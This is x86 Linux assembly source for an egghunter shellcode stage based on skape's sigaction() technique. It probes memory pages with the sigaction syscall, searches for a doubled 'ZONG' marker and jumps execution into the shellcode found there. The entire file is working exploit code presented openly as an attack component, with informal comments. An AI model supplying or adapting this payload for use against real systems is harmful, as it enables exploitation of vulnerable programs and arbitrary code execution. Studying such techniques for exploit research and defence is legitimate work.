; based largely off of: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
; sigaction() Linux egghunter method (3rd)

;;; int sigaction(	int signum, 
;;; 		const struct sigaction *act, 
;;; 		struct sigaction *oldact	);
;;; 
;;; #define __NR_sigaction 67
;;; 
;;; struct sigaction{  	__sighandler_t sa_handler;
;;; 		   	__sigset_t sa_mask;
;;; 		  	int sa_flags;
;;; 		   	void (*sa_restorer) (void);	};


section .text
global _start
_start:
	cld		;ensure direction flag NOT set
	xor ecx, ecx	;zero ECX; probably safest if started from the bottom
			; so now we're here lol
validate:
	or cx, 0xfff 	;
search:
	inc ecx		; align to PAGE_SIZE; nice 8-bit round number 0xfff +1 = 0x1000
	push byte 67
	pop eax		;syscall __NR_sigaction 67 (0x43)
			;, will try to validate a sigaction_structure region.
			;, such a region will be sizeof(struct sigaction), which is
			;, four 8-bit addresses, or 32-bits region, or 16 bytes..
	int 0x80	;sigaction returns zero if valid region, 0xf2 in al
			;, for EFAULT if not.
	cmp al, 0xf2	; al == EFAULT?  ZF set if so
	jz  validate	; basically keep looping until non-uninitialized mem found

	mov eax, "ZONG"	; egg; string literal

	mov edi, ecx	; pointer-to-address
	scasd		; compares string in eax to byte, word, or doubleword 
			;, pointed-to by edi. if equal, sets ZF.  If not, clears ZF
	jnz search	; if scasd eval equal, continue, else jmp back to search
	scasd		;tryna find them two eggs in a row though, mellow
	jnz search	; if scasd eval equal, continue, else jmp back to search
	jmp edi		; if we make it here, last two comparisons found two eggs,
			;, one after the other. So pass execution to this region, 
			;, because shellcode, that's why
	
